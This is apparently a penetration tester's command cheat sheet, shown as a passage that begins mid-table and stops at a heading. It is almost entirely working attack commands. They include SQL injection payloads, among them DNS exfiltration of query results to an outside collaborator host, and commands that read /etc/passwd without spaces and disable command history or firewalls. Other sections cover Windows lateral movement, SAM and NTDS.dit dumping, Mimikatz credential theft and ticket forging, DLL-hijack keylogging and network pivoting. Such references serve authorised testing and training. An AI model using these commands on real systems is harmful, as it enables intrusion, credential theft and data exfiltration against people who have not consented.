| 'or a=a-   | "or a=a-   | or 'a'='a'  | 'or 'a'='a' | "or 'a'='a' | ')or('a'='a' |
| ")"a"="a"  | ')'a'='a   | 'or"='      | ' or 1=1--  | " or 1=1--  | or 1=1--     |
| " or 1=1\# |            |             |             |             |              |

<span id="anchor-114"></span>SQL Comment Formats

<span id="anchor-115"></span>Microsoft SQL/PostgreSQL v1

```
--comment
```

<span id="anchor-116"></span>Microsoft SQL/PostgreSQL v1

```
/\*comment\*/
```

<span id="anchor-117"></span>Oracle v1

```
--comment
```

<span id="anchor-118"></span>MySQL v1 (Note the space)

```
-- comment
```

<span id="anchor-119"></span>MySQL v2

```
\#comment
```

<span id="anchor-120"></span>MySQL v3

```
/\*comment\*/
```

<span id="anchor-121"></span>SQL String Concatenation

<span id="anchor-122"></span>Oracle & PostgreSQL

```
'foo'\|\|'bar'
```

<span id="anchor-123"></span>MySQL

```
'foo' 'bar'
CONCAT('foo','bar')</p></td>
```

<span id="anchor-124"></span>Microsoft

```
'foo'+'bar'
```

<span id="anchor-125"></span>SQL Time Delays

<span id="anchor-126"></span>Oracle

```
dbms\_pipe.receive\_message(('a'),10)
```

<span id="anchor-127"></span>Microsoft

```
WAITFOR DELAY '0:0:10'
```

<span id="anchor-128"></span>PostgreSQL

```
SELECT pg\_sleep(10)
```

<span id="anchor-129"></span>MySQL

```
SELECT sleep(10)
```

<span id="anchor-130"></span>SQL Conditional Time Delays

<span id="anchor-131"></span>Oracle

```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms\_pipe.receive\_message(('a'),10) ELSE NULL END FROM dual
```

<span id="anchor-132"></span>Microsoft

```
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
```

<span id="anchor-133"></span>PostgreSQL

```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg\_sleep(10) ELSE pg\_sleep(0) END
```

<span id="anchor-134"></span>MySQL

```
SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')
```

<span id="anchor-135"></span>SQL DNS Lookup

<span id="anchor-136"></span>Oracle

```
SELECT extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"&gt; %remote;]&gt;'),'/l') FROM dual
Or
SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')</p></td>
```

<span id="anchor-137"></span>Microsoft

```
exec master..xp\_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'
```

<span id="anchor-138"></span>PostgreSQL

```
copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'
```

<span id="anchor-139"></span>MySQL (Windows only)

```
LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')
SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'</p></td>
```

<span id="anchor-140"></span>SQL DNS Lookup w/Data Exfiltration

<span id="anchor-141"></span>Oracle

```
SELECT extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root \[ &lt;!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"&gt; %remote;\]&gt;'),'/l') FROM dual
```

<span id="anchor-142"></span>Microsoft

```
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp\_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')
```

<span id="anchor-143"></span>PostgreSQL

```
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();</p></td>
```

<span id="anchor-144"></span>MySQL (Windows only)

```
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a'
```

<span id="anchor-145"></span>SQL Database Enumeration Examples

<span id="anchor-146"></span>Discover Database Version (Microsoft SQL,
MySQL)

```
http://&lt;someserver&gt;/comment.php?id=758 union all select 1,2,3,4,@@version,6
```

<span id="anchor-147"></span>Discover Database Version v1 (Oracle)

```
http://&lt;someserver&gt;/comment.php?id=758 union all select 1,2,3,4,v$version,6
```

<span id="anchor-148"></span>Discover Database Version v2 (Oracle)

```
http://&lt;someserver&gt;/comment.php?id=758 union all select 1,2,3,4,banner,6 FROM v$version
```

<span id="anchor-149"></span>Discover Database Version v3 (Oracle)

```
http://&lt;someserver&gt;/comment.php?id=758 union all select 1,2,3,4,version,6 FROM v$instance
```

<span id="anchor-150"></span>Discover Database Version (PostgreSQL)

```
http://&lt;someserver&gt;/comment.php?id=758 union all select 1,2,3,4,version(),6
```

<span id="anchor-151"></span>Discover Database User

```
http://&lt;someserver&gt;/comment.php?id=758 union all select 1,2,3,4,user(),6
```

<span id="anchor-152"></span>Enumerating Table Names (MySQL, Microsoft
SQL)

This example is injecting a “union all select” statement to place the
list of table names into column 5

```
http://&lt;someserver&gt;/comment.php?id=758 union all select 1,2,3,4,table\_name,6 FROM information\_schema.tables
```

```
%' and 1=0 union select null, table\_name from information\_schema.tables \#
```

<span id="anchor-153"></span>Enumerating Column Names of a Table (MySQL,
Microsoft SQL)

This example is injecting a “union all select” statement to list the
column names of the supplied talle.

```
http://**&lt;server&gt;**/**&lt;somefile&gt;**.php?**&lt;somevariable&gt;**=**&lt;somevalue&gt;** union all select 1,2,3,4,column\_name,6 FROM information\_schema.columns where table\_name=’**&lt;table\_name&gt;**’
```

```
%' and 1=0 union select null, column\_name from information\_schema.columns where table\_name = 'users' \#”
```

<span id="anchor-154"></span>Enumerating Table Names (Oracle)

```
SELECT table\_name FROM all\_tables
```

<span id="anchor-155"></span>Enumerating Column Names (Oracle)

```
SELECT column\_name FROM all\_tab\_columns WHERE table\_name = '**&lt;table\_name&gt;**'
```

<span id="anchor-156"></span>Collecting Specific Information

```
%' UNION SELECT user, password from users \#
```

<span id="anchor-157"></span>Error Based Blind Enumeration

<span id="anchor-158"></span>Enumerate Database Name

```
1 AND ORD(MID((SELECT IFNULL(CAST(database() AS CHAR), 0x20)),1,1))&gt;1
```

<span id="anchor-159"></span>Enumerate Table Name

```
1 AND ORD(MID((SELECT IFNULL(CAST(table\_name AS CHAR),0x20) FROM information\_schema.tables WHERE table\_schema=database() ORDER BY table\_name LIMIT 0,1),1,1))&gt;1
```

<span id="anchor-160"></span>Enumerate Column Name

```
1 AND ORD(MID((SELECT IFNULL(CAST(column\_name AS CHAR),0x20) FROM information\_schema.columns WHERE table\_name=0x6775657374626f6f6b ORDER BY column\_name LIMIT 0,1),1,1))&gt;1
```

<span id="anchor-161"></span>Enumerate Field Value

Explaination:

-   ORD(string) - Returns the leftmost character in a string
-   MID(string, position, length) - Extracts a substring, returns 5th
    position single character
-   IFNULL(expression1, expression2) - Returns 1st expression is not
    NULL, otherwise returns 2nd
-   CAST() - Casts the string containing the column name to CHAR
-   0x20 is a space and the first printable ASCII character
-   LIMIT 0, 1 - Returns first single row.

This query will return true if the single character that is in the 5th
position of the name field in the first row of the guestbook table of
the dvwa database is greater than 1. The final number is increased until
the result is false. A false result, past 1, indicates that the value
was located. If the false result happens at 1, that means that the value
is NULL/non-existent.

```
1 AND ORD(MID((SELECT IFNULL(CAST(name AS CHAR),0x20) FROM dvwa.guestbook ORDER BY name LIMIT 0,1),5,1))&gt;1
```

<span id="anchor-162"></span>Linux Commands

<span id="anchor-163"></span>Disable Command History

```
unset HISTFILE
```

<span id="anchor-164"></span>Check Linux Distribution

<span id="anchor-165"></span>Method 1

```
cat /etc/\*-release
```

<span id="anchor-166"></span>Method 2

```
Lsb\_release -a
```

<span id="anchor-167"></span>Remove All Lines with non-ASCII Characters

```
perl -nle 'print if m{^\[\[:ascii:\]\]+$}' **&lt;inputfile&gt;**
```

<span id="anchor-168"></span>Remove All Lines with ASCII Characters

```
perl -nle 'print if !m{^\[\[:ascii:\]\]+$}' **&lt;inputfile&gt;**
```

<span id="anchor-169"></span>Convert From Windows(dos) to Unix File
Format

<span id="anchor-170"></span>dos2unix

```
dos2unix **&lt;filename&gt;**
```

<span id="anchor-171"></span>vi(m)

```
:1,$s/^M//g
:set ff=unix
:w
To enter “^M” press <strong>CTRL+V</strong> then <strong>Enter</strong></p></td>
```

<span id="anchor-172"></span>awk

```
awk '{ sub("\\r$", ""); print }' **&lt;winfile&gt;** &gt; **&lt;unixfile&gt;**
```

<span id="anchor-173"></span>perl

```
perl -p -e 's/\\r$//' &lt; **&lt;winfile&gt;** &gt; **&lt;unixfile&gt;**
```

<span id="anchor-174"></span>tr

```
tr -d '\\15\\32' &lt; **&lt;winfile&gt;** &gt; **&lt;unixfile&gt;**
```

<span id="anchor-175"></span>Dump Samba Credentials

```
pdbdump -Lw
```

```
pbtool **&lt;file&gt;** dump
```

<span id="anchor-176"></span>Execute Commands Without Spaces (Examples)

```
IFS=,;`cat&lt;&lt;&lt;cat,/etc/passwd`
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat&lt;/etc/passwd               
{cat,/etc/passwd} OR {ls,-las,/var} with args
X=$'cat\x20/etc/passwd'&amp;&amp;$X</td>
```

<span id="anchor-177"></span>Windows Commands

<span id="anchor-178"></span>PowerShell

<span id="anchor-179"></span>Encoding Commands from File (Linux)

```
iconv -f ASCII -t UTF-16LE **&lt;file&gt;** \| base64 -w 0
```

<span id="anchor-180"></span>Encoding Commands from Inline (Linux)

```
echo "**&lt;command&gt;**" \| iconv -t UTF-16LE \| base64 -w 0
```

<span id="anchor-181"></span>Encoding Commands with Python

```
from base64 import b64encode
b64encode('<strong>&lt;command&gt;</strong>').encode('UTF-16LE')</p></td>
```

<span id="anchor-182"></span>Encoding Commands with Ruby

```
require "base64"
Base64.encode64('<strong>&lt;command&gt;</strong>'.force_encoding('UTF-16LE'))</p></td>
```

<span id="anchor-183"></span>Checking for Access Level

<span id="anchor-184"></span>Check Username

```
Echo %USERNAME%
```

<span id="anchor-185"></span>Use DIR to Check For Admin Rights

```
dir \\\\**&lt;host&gt;**\\C$
```

<span id="anchor-186"></span>Use AT to Check For Admin Rights

```
at \\\\**&lt;host&gt;**
```

<span id="anchor-187"></span>System Details

<span id="anchor-188"></span>Discover Domain (workstation)

```
net config workstation
```

<span id="anchor-189"></span>Discover Domain (server)

```
net config workstation
```

<span id="anchor-190"></span>View Domain Controller Name Via Registry

```
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\ CurrentVersion\\Group Policy\\History" /v DCName
```

<span id="anchor-191"></span>Check Patch Level

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

<span id="anchor-192"></span>Check for Specific Installed Path

```
wmic qfe get Caption,Description,HotFixID,InstalledOn \| findstr /C:"**&lt;kbnumber&gt;**"
```

<span id="anchor-193"></span>Get Drive Details

```
wmic logicaldisk get caption,description,providername
```

<span id="anchor-194"></span>Firewall

<span id="anchor-195"></span>Disable Firewall (Windows XP)

```
netsh firewall set opmode disable
```

<span id="anchor-196"></span>Enable Firewall (Windows XP)

```
netsh firewall set opmode enable
```

<span id="anchor-197"></span>Disable Firewall (Windows Vista, Requires
Elevation, UAC)

```
netsh advfirewall set currentprofile state off
```

<span id="anchor-198"></span>Enable Firewall (Windows Vista, Requires
Elevation, UAC)

```
netsh advfirewall set currentprofile state on
```

<span id="anchor-199"></span>Check Firewall Status (Windows Vista &
Newer)

```
netsh advfirewall firewall dump
```

<span id="anchor-200"></span>Check Firewall Status (Windows XP)

```
netsh firewall show state
```

<span id="anchor-201"></span>Show Firewall Configuration (Windows XP)

```
Netsh firewall show config
```

<span id="anchor-202"></span>User & Group Commands

<span id="anchor-203"></span>Current User Privileges

```
whoami /priv
```

<span id="anchor-204"></span>Current User Groups

```
whoami /groups
```

<span id="anchor-205"></span>User Details (local)

```
net user **&lt;username&gt;**
```

<span id="anchor-206"></span>User Details (domain)

```
net user **&lt;username&gt;** /domain
```

<span id="anchor-207"></span>Create a User

```
net user **&lt;username&gt;** **&lt;password&gt;** /ADD
```

<span id="anchor-208"></span>Add a User to a Group

```
net localgroup **&lt;groupname&gt;** **&lt;username&gt;** /add
```

<span id="anchor-209"></span>Find Domain Admins

```
net group "Domain Admins" /domain
```

<span id="anchor-210"></span>Find Enterprise Admins

```
net group “Enterprise Admins” /domain
```

<span id="anchor-211"></span>List Local Groups

```
net localgroup
```

<span id="anchor-212"></span>List Local Group Members

```
net localgroup **&lt;groupname&gt;**
```

<span id="anchor-213"></span>List Local Password Policy

```
net accounts
```

<span id="anchor-214"></span>List Domain Password Policy

```
net accounts /domain
```

<span id="anchor-215"></span>Command Execution

<span id="anchor-216"></span>WMIC Execute a Command (Admin)

```
wmic /node:”**&lt;host&gt;**” process call create “**&lt;program&gt;**”
```

<span id="anchor-217"></span>PowerShell Execute a Command (Admin, WinRM,
Port 5985)

```
Invoke-Command -ComputerName **&lt;host&gt;** -ScriptBlock { **&lt;command&gt;** }
```

<span id="anchor-218"></span>PowerSploit Execute a Command (Admin,
Non-Bind)

```
Invoke-WmiCommand -ComputerName **&lt;target&gt;** -Payload { **&lt;command&gt;** } \| select -exp “PayloadOutput”
```

<span id="anchor-219"></span>PowerShell Execution of SCT File Using .NET
Assemblies

```
[Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');
[Microsoft.Jscript.Eval]::JScriptEvaluate('GetObject("script:<strong>&lt;SCT_URL&gt;</strong>").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine());</p></td>
```

<span id="anchor-220"></span>Lateral Movement

<span id="anchor-221"></span>Create Service w/WINRM.EXE

```
winrm invoke Create wmicimv2/Win32_Service @{Name="<strong>&lt;name&gt;</strong>";DisplayName="<strong>&lt;name&gt;</strong>";PathName="<strong>&lt;command&gt;</strong>"} -r:http://<strong>&lt;hostname&gt;</strong>:5985
winrm invoke StartService wmicimv2/Win32_Service?Name=<strong>&lt;name&gt;</strong> -r:http://<strong>&lt;hostname&gt;</strong>:5985</p></td>
```

<span id="anchor-222"></span>Processes

<span id="anchor-223"></span>PowerShell - Get-Process

```
Get-Process
```

<span id="anchor-224"></span>TaskList List Processes

```
tasklist /v /S **&lt;host&gt;**
```

<span id="anchor-225"></span>TaskList Kill Processes

```
tasklist /S **&lt;host&gt;** /PID **&lt;pid&gt;** /F
```

<span id="anchor-226"></span>Find a Specific Processes Information

```
tasklist \| findstr /i “**&lt;process\_name&gt;**”
```

<span id="anchor-227"></span>WMIC List Processes - Full

```
wmic /node:”**&lt;host&gt;**” process list full
```

<span id="anchor-228"></span>WMIC List Processes - Brief

```
wmic /node:”**&lt;host&gt;**” process list brief
```

<span id="anchor-229"></span>WMIC Kill Process by PID

```
wmic /node:”**&lt;host&gt;**” where (ProcessID = “**&lt;PID&gt;**”) call terminate
```

<span id="anchor-230"></span>WMIC Kill Process by Name

```
wmic /node:”**&lt;host&gt;**” where (Name = “**&lt;PE Name&gt;**”) call terminate
```

<span id="anchor-231"></span>Services

<span id="anchor-232"></span>List Services

[*https://technet.microsoft.com/en-us/library/cc990290(v=ws.11).aspx*](https://technet.microsoft.com/en-us/library/cc990290(v=ws.11).aspx)

```
sc query type= service state= all
```

<span id="anchor-233"></span>List Services (Old Way)

```
net start
```

<span id="anchor-234"></span>Find Services with Unquoted Paths (wmic)

```
wmic service get name,displayname,pathname,startmode \|findstr /i "Auto" \|findstr /i /v "C:\\Windows\\\\" \|findstr /i /v """
```

<span id="anchor-235"></span>Find Services with Unquoted Paths
(PowerShell)

```
Get-WmiObject win32\_service \| select name,pathname \| Where-Object -Filter { $\_.pathname -notlike "\`"\*\`"\*" -and $\_.pathname -notlike "C:\\WINDOWS\\\*" -and -$\_.pathname }
```

<span id="anchor-236"></span>Enable Service (Admin or User Modifiable
Service)

```
sc config **&lt;service&gt;** start= demand
```

<span id="anchor-237"></span>Start Service (Admin or User Modifiable
Service)

```
net start **&lt;service&gt;**
```

<span id="anchor-238"></span>Stop Service (Admin or User Modifiable
Service)

```
net stop **&lt;service&gt;**
```

<span id="anchor-239"></span>Create a Service (Admin, Service PE)

```
sc \\\\**&lt;host&gt;** create **&lt;name&gt;** binpath= **&lt;program&gt;**
```

**Note: **You can create a service that runs CMD with the /C or /K that
specified another command. Windows will kill the CMD but leave the
program it runs active.

<span id="anchor-240"></span>Edit a Writable Service (use accesschk.exe
to find one)

```
# Change the command
sc config <strong>&lt;servicename&gt;</strong> binpath= “<strong>&lt;command and arguments&gt;</strong>”
# Change the User the service runs as
sc config <strong>&lt;servicename&gt;</strong> obj= “.\LocalSystem” password= “”</p></td>
```

<span id="anchor-241"></span>Scheduled Tasks (Admin)

<span id="anchor-242"></span>Schedule a Task with AT

```
<strong>Check the time with:</strong>
net time \\<strong>&lt;host&gt;</strong>
<strong>Schedule the task with:</strong>
at \\<strong>&lt;host&gt; HH:MM &lt;command&gt;</strong></p></td>
```

<span id="anchor-243"></span>Schedule a Task with SCHTASKS

```
<strong>Create the task:</strong>
schtasks /create /tn <strong>&lt;name&gt;</strong> /tr <strong>&lt;program&gt;</strong> /sc once /st 00:00 /S <strong>&lt;host&gt;</strong> /RU System
<strong>Run the task:</strong>
schtasks /run /tn <strong>&lt;name&gt;</strong> /S <strong>&lt;host&gt;</strong></p></td>
```

<span id="anchor-244"></span>Network Discovery

<span id="anchor-245"></span>PowerShell - List Connections

```
Get-NetTCPConnection
```

<span id="anchor-246"></span>List Established Connections

```
netstat -anp **\[tcp\|udp\]** \| find “ESTAB”
```

<span id="anchor-247"></span>List Listening Ports

```
netstat -anp **\[tcp\|udp\]** \| find “LISTEN”
```

<span id="anchor-248"></span>List Open Ports with PIDs

```
netstat -ano
```

<span id="anchor-249"></span>Show IP Addressing Configuration Details

```
netsh interface ip show addresses
```

<span id="anchor-250"></span>Show IP Routing Configuration Details

```
netsh interface ip show route
```

<span id="anchor-251"></span>Show IP Neighbor Details

```
netsh interface ip show neighbors
```

<span id="anchor-252"></span>ARP Table List

```
arp -a
```

<span id="anchor-253"></span>Display DNS Cache

```
ipconfig /displaydns
```

<span id="anchor-254"></span>Display Ports with Connections and
Processes

```
netstat -nabo
```

<span id="anchor-255"></span>Display Routing Table (netstat)

```
netstat -r
```

<span id="anchor-256"></span>Display Routing Table (route)

```
route print
```

<span id="anchor-257"></span>Find Specific Listening Port

```
netstat -na \| findstr :**&lt;port&gt;**
```

<span id="anchor-258"></span>Find Listening Ports and PIDs

```
netstat -nao \| findstr LISTENING
```

<span id="anchor-259"></span>Find Hosts in the Same Workgroup

```
net view
```

<span id="anchor-260"></span>Find Hosts in Another Domain

```
net view /domain:**&lt;domain&gt;**
```

<span id="anchor-261"></span>Find Visible Domains

```
net view /domain
```

<span id="anchor-262"></span>Find Domain Controllers

```
net group “Domain Controllers” /domain
```

<span id="anchor-263"></span>Get Domain/Domain Controller Details

```
wmic ntdomain list
```

<span id="anchor-264"></span>List HOSTS File Contents

```
type %WINDIR%\\System32\\drivers\\etc\\hosts
```

<span id="anchor-265"></span>Windows Wireless Networking

<span id="anchor-266"></span>List Saved Wireless Profiles

```
netsh wlan show profiles
```

<span id="anchor-267"></span>Export Saved Wireless Profile

```
netsh wlan export profile folder=. key=clear
```

<span id="anchor-268"></span>Add Specified Wireless Profile

```
netsh wlan set hostednetwork ssid=**&lt;ssid&gt;** key=**&lt;passphrase&gt;** keyUsage=**\[persistent\|temporary\]**
```

<span id="anchor-269"></span>Start or Stop Wireless Network

```
netsh wlan **\[start\|stop\]** hostednetwork
```

<span id="anchor-270"></span>Enable or Disable Wireless Network

```
netsh wlan set hostednetwork mode=**\[allow\|disallow\]**
```

<span id="anchor-271"></span>Shares

<span id="anchor-272"></span>Turn Default Share On

```
net share **&lt;(C$\|ADMIN$)&gt;**
```

<span id="anchor-273"></span>Registry Enumeration

<span id="anchor-274"></span>Locate &lt;string&gt; In Registry (i.e.
password)

```
reg query **\[HKLM\|HKCU\]** /f **&lt;string&gt;** /t REG\_SZ /s
```

<span id="anchor-275"></span>Always Install Elevated Check

```
reg query **\[HKLM\|HKCU\]**\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated
```

<span id="anchor-276"></span>Crypto Commands

<span id="anchor-277"></span>Base64 Encode a File

```
certutil.exe -encode **&lt;inputfile&gt;** **&lt;outputfile&gt;**
```

<span id="anchor-278"></span>Base64 Decode a File

```
certutil.exe -decode **&lt;inputfile&gt;** **&lt;outputfile&gt;**
```

<span id="anchor-279"></span>Credential Commands

<span id="anchor-280"></span>Dumping Registry Hives (System User)

```
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save</td>
```

<span id="anchor-281"></span>Dumping Windows Repair SAM & System
(Windows XP, System User)

```
C:\Windows\Repair\SAM
C:\Windows\Repair\SYSTEM</p></td>
```

<span id="anchor-282"></span>Dumping Windows Repair SAM & System
(Windows 7, System User)

```
C:\windows\system32\config\RegBack\SAM
C:\windows\system32\config\RegBack\SYSTEM</p></td>
```

<span id="anchor-283"></span>Dump Active Directory NTDS.dit with
NTDSUTIL

```
ntdsutil “activate instance ntds” “IFM” “create full **&lt;outputfile&gt;**” q q
```

<span id="anchor-284"></span>Dump Active Directory NTDS.dit with
Invoke-NinjaCopy

```
Invoke-NinjaCopy -Path “**&lt;path&gt;**\\ntds.dit” -ComputerName “**&lt;DCName&gt;**” -LocalDestination “**&lt;outputfile&gt;**”
```

<span id="anchor-285"></span>Dump Active Directory NTDS.dit with Volume
Shadow Copy

```
wmic /node:<strong>&lt;DC FQDN&gt;</strong> /user:<strong>&lt;domain&gt;</strong>\<strong>&lt;user&gt;</strong> /password:<strong>&lt;password&gt;</strong> process call create “cmd /c vssadmin create shadow /for=<strong>&lt;driveletter</strong>&gt;: 2&gt;&amp;1 &gt; <strong>&lt;logfile&gt;</strong>
wmic /node:<strong>&lt;DC FQDN&gt;</strong> /user:<strong>&lt;domain&gt;</strong>\<strong>&lt;user&gt;</strong> /password:<strong>&lt;password&gt;</strong> process call create “cmd /c copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\<strong>&lt;NTDS.dit_Path&gt;</strong> <strong>&lt;destination_path&gt;</strong> 2&gt;&amp;1 &gt; <strong>&lt;logfile&gt;</strong>
wmic /node:<strong>&lt;DC FQDN&gt;</strong> /user:<strong>&lt;domain&gt;</strong>\<strong>&lt;user&gt;</strong> /password:<strong>&lt;password&gt;</strong> process call create “cmd /c copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM <strong>&lt;destination_path&gt;</strong> 2&gt;&amp;1 &gt; <strong>&lt;logfile&gt;</strong></p></td>
```

<span id="anchor-286"></span>Invoke-MimiKatz Retrieve All Credentials

```
Invoke-Mimikatz -ComputerName **&lt;host&gt;**
```

<span id="anchor-287"></span>Invoke-MimiKatz Retrieve Credentials for a
Single User from a DC

```
Invoke-Mimikatz -Command “lsadump::dcsync /domain:**&lt;domain FQDN&gt;** /user:**&lt;domain&gt;**\\**&lt;user&gt;**”
```

<span id="anchor-288"></span>Invoke-MimiKatz Pass-the-Hash (PTH)

```
Invoke-Mimikatz -Command “sekurlsa::pth /user:**&lt;user&gt;** /domain:**&lt;domain&gt;** /ntlm:**&lt;hash&gt;** /run:**&lt;program&gt;**”
```

<span id="anchor-289"></span>MimiKatz Get Logon Passwords (From Memory)

```
privilege::debug
sekurlsa::logonpasswords</p></td>
```

<span id="anchor-290"></span>MimiKatz Dump Tickets (From Memory)

```
privilege::debug
sekurlsa::tickets /export</p></td>
```

<span id="anchor-291"></span>MimiKatz Pass-the-Hash (PTH)

```
privilege::debug
sekurlsa::pth /user:<strong>&lt;user&gt;</strong> /domain:<strong>&lt;domain FQDN&gt;</strong> /ntlm:<strong>&lt;hash&gt;</strong> /run:<strong>&lt;cmd&gt;</strong></p></td>
```

<span id="anchor-292"></span>MimiKatz Pass-the-Ticket (PTT) - Generate
Golden Ticket

```
privilege::debug
kerberos::golden /user:<strong>&lt;user&gt;</strong> /domain:<strong>&lt;domain FQDN&gt;</strong> /sid:<strong>&lt;SID&gt;</strong> /krbtgt:<strong>&lt;hash&gt;</strong> /ticket:<strong>&lt;filename&gt;</strong></p></td>
```

<span id="anchor-293"></span>MimiKatz Pass-the-Ticket (PTT) - Inject
Golden Ticket

```
privilege::debug
kerberos::golden /user:<strong>&lt;user&gt;</strong> /domain:<strong>&lt;domain FQDN&gt;</strong> /sid:<strong>&lt;SID&gt;</strong> /krbtgt:<strong>&lt;hash&gt;</strong> /ptt</p></td>
```

<span id="anchor-294"></span>MimiKatz Pass-the-Ticket (PTT) - Generate &
Pass Silver Ticket

```
privilege::debug
kerberos::silver /user:<strong>&lt;user&gt;</strong> /domain:<strong>&lt;domain FQDN&gt;</strong> /sid:<strong>&lt;SID&gt;</strong> /krbtgt:<strong>&lt;hash&gt;</strong> /target:<strong>&lt;target FQDN&gt;</strong> /service:<strong>&lt;servicename&gt;</strong> /ptt</p></td>
```

<span id="anchor-295"></span>MimiKatz Pass-the-Ticket (PTT) - Passing a
Ticket (Current Session)

```
privilege::debug
Kerberos::ptt <strong>&lt;ticketfile&gt;</strong></p></td>
```

<span id="anchor-296"></span>MimiKatz Elivate to SYSTEM (Must be
Administrator)

```
token::elevate
```

<span id="anchor-297"></span>MimiKatz Dump SAM (Live, Requires SYSTEM)

```
lsadump::sam
```

<span id="anchor-298"></span>MimiKatz Dump SAM (From Backup)

```
lsadump::sam **&lt;systemfile&gt;** **&lt;samfile&gt;**
```

<span id="anchor-299"></span>MimiKatz Dump Specific User Hash (LSA)

```
lsadump::lsa /inject /name:**&lt;user&gt;**
```

<span id="anchor-300"></span>MimiKatz Dump Specific User Hash (DC
Synchronization)

```
lsadump::dcsync /domain:**&lt;domain FQDN**&gt; /user:**&lt;username&gt;**
```

<span id="anchor-301"></span>MimiKatz Dump Service Password

```
privilege::debug
token::elevate
vault::cred /patch</p></td>
```

<span id="anchor-302"></span>MimiKatz Dump DPAPI Creds

```
privilege::debug
token::elevate
dpapi::cred /in:%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\<strong>&lt;credentialfile&gt;</strong></p></td>
```

<span id="anchor-303"></span>RUNAS to Create Token & Run Process
(Password Known)

```
runas /netonly /user:**&lt;domain&gt;**\\**&lt;user&gt;** **&lt;command&gt;**
```

**Note:** You will still be recognized as the user your ran the command
as on the local system. Remote systems will see the token you generated.
This is how Pass-the-Hash (PTH)works. This technique can be used to
build the hash needed for a PTH.

<span id="anchor-304"></span>Keylogging & Desktop Monitoring

<span id="anchor-305"></span>Start Recording Screens with Problem Step
Recorder (Must be run with user’s credentials)

```
psr.exe /start /gui 0 /output **&lt;ZIP file path&gt;**
```

<span id="anchor-306"></span>Stop Recording Screens with Problem Step
Recorder

```
psr.exe /IT /RU **&lt;domain&gt;**\\**&lt;user&gt;** /RP **&lt;password&gt;**
```

<span id="anchor-307"></span>Keylogging with DLL Hijacking

Compile a Keylogger as a DLL and place it in the following directory,
then kill and **explorer.exe**:

```
\\\\**&lt;host&gt;**\\C$\\Windows\\linkinfo.dll
```

**Note:** Logging will start once the user clicks the Start button.

<span id="anchor-308"></span>Network Tricks

<span id="anchor-309"></span>Pivot with NETSH

```
netsh interface portproxy add v4tov4 listenport=**&lt;LPORT&gt;** listenaddress=0.0.0.0 connectionport=**&lt;FPORT&gt;** connectaddress=**&lt;FHOST&gt;**
```

<span id="anchor-310"></span>Remove Pivot with NETSH

```
netsh interface portproxy reset
```

<span id="anchor-311"></span>Windows Miscellaneous Commands

<span id="anchor-312"></span>Abort Windows Shutdown

```
shutdown /a
```

<span id="anchor-313"></span>Enable Remote Desktop (Registry)

```
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t 
REG_DWORD /d 0 /f</p></td>
```

<span id="anchor-314"></span>List Group Policy

```
gpresults /z
```

<span id="anchor-315"></span>List All Files In a Directory Including
Hidden & System

```
dir /a
```

<span id="anchor-316"></span>Windows GUI Shortcuts & Commands

<span id="anchor-317"></span>Open Explorer In Folder View

```
explorer.exe /e **&lt;folderpath&gt;**
```

<span id="anchor-318"></span>Open Programs and Features (Add/Remove
Programs)

```
appwiz.cpl
```

<span id="anchor-319"></span>AccessChk.exe (Sysinternals)

<span id="anchor-320"></span>Check Specific Service Permissions

```
accesschk.exe /accepteula -ucqv **&lt;servicename&gt;**
```

<span id="anchor-321"></span>Check For Any Service Permissions
(pre-Windows 8)

```
accesschk.exe /accepteula -uwcqv "Authenticated Users" \*
```

<span id="anchor-322"></span>Find all Directories Writable By Users

```
accesschk.exe /accepteula -uwdqs Users **&lt;path&gt;**
```

<span id="anchor-323"></span>Find all Directories Writable By
Authenticated Users

```
accesschk.exe /accepteula -uwdqs “Authenticated Users” **&lt;path&gt;**
```

<span id="anchor-324"></span>Find all Files Writable By Users

```
accesschk.exe /accepteula -uwqs Users **&lt;path&gt;**\\\*.\*
```

<span id="anchor-325"></span>Find all Files Writable By Authenticated
Users

```
accesschk.exe /accepteula -uwqs “Authenticated Users” **&lt;path&gt;**\\\*.\*
```

<span id="anchor-326"></span>Commands That do Other Things (LOLBins:
Inspired by Odvar Moe’s list)

<span id="anchor-327"></span>Run Commands with ForFiles

```
